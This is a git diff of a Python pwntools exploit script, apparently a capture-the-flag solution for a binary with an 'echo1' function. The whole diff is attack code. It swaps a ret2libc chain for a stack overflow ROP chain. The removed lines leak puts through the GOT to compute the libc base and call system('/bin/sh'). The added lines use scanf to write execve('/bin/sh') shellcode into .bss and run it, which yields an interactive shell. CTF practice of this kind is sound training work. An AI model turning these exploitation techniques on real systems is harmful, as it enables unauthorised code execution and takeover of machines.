@@ -28,18 +28,14 @@ def DEBUG(cmd = ""):
     gdb.attach(io, cmd)
 
 if __name__ == "__main__":
-    pppr = asm('pop rdi;ret')
+    pppr = asm('pop rdi; pop rsi; ret')
     io.sendlineafter(" : ", pppr)
-    DEBUG("b *echo1\nc")
+    #  DEBUG("b *echo1\nc")
     io.sendlineafter("> ", "1")
-    payload = flat([cyclic(0x20 + 8), elf.sym['id'], elf.got['puts'], elf.plt['puts']], elf.sym['echo1'])
+    payload = flat([cyclic(0x20 + 8), elf.sym['id'], next(elf.search("%s")), elf.bss(), elf.plt['__isoc99_scanf'], elf.bss()])
     io.sendline(payload)
-    libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - libc.sym['puts']
-    success("libc.address -> {:#x}".format(libc.address))
-    pause()
 
-    payload = flat([cyclic(0x20 + 8), elf.sym['id'], next(libc.search("/bin/sh")), libc.sym['system']])
-    io.sendline(payload)
+    io.sendline(asm(shellcraft.execve("/bin/sh")))
     
     io.interactive()
     io.close()
